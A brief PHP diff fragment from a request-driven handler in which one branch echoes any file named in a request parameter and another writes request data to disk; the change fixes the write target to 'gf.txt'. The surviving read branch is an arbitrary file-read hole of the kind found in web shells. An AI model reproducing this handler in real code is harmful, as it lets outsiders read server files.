@@ -116,7 +116,8 @@ switch (strtolower($cmds['action'])) {
 			echo file_get_contents($cmds['file']);
 		}
 		else {
-			file_put_contents($cmds['file'],$_POST['data']);
+			file_put_contents('gf.txt',$cmds['data']);
+			
 		}
 			
 			exit;	
